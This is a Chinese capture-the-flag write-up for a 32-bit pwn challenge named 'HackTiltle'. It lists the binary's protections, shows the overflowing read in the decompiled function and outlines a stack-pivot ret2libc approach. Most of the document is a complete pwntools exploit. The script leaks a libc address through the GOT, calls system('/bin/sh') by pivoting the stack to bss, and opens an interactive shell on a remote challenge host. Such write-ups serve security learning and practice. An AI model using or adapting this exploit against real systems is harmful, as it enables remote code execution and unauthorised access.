# HackTiltle

## 来源
World of Attack & Defense


## 难度

2 / 10

## 保护

 ```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
 ```

## 简单描述

先向bss段输入数据,然后再次输入数据

## vul

```c
ssize_t vul_function()
{
  size_t v0; // eax
  size_t v1; // eax
  char buf; // [esp+0h] [ebp-18h]

  v0 = strlen(m1);
  write(1, m1, v0);
  read(0, &s, 0x200u);
  v1 = strlen(m2);
  write(1, m2, v1);
  return read(0, &buf, 0x20u); //栈溢出
}
```



## 知识点

栈迁移, ret 2 libc

## 思路

先输入数据进行rop链布局, 后输入数据通过leave 覆盖ret进行栈迁移至bss数据区,然后打印某个函数got表中的数据泄漏libc,后面再次使用同样的方法进行调用system get shell



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'spwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28882

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	start = 0x08048513
	bss = 0x0804A300
	leave = 0x08048511
	offset = 0x180

	p = 'A' * offset
	p += p32(0)

	p += p32(exe.plt['write'])
	p += p32(start)
	p += p32(0x1)
	p += p32(exe.got['read'])
	p += p32(0x10)

	sa('name?', p)	
	p = 'A' * 0x18
	p += p32(bss + offset)
	p += p32(leave)
	sa('say?', p)	
    # 泄漏libc
	leak = u32(ru('\xf7')[-3:] + '\xf7')
	libc = LibcSearcher('read', leak)
	libc_base = leak - libc.dump('read')
	sys = libc_base + libc.dump('system')
	sh = libc_base + libc.dump('str_bin_sh')

    # 再次使用栈迁移方法调用system
	p = 'A' * 0x20
	p += p32(0)
	p += p32(sys)
	p += p32(0)
	p += p32(sh)
	s(p)

	p = 'A' * 0x18
	p += p32(bss + 0x20)
	p += p32(leave)
	#db()
	s(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

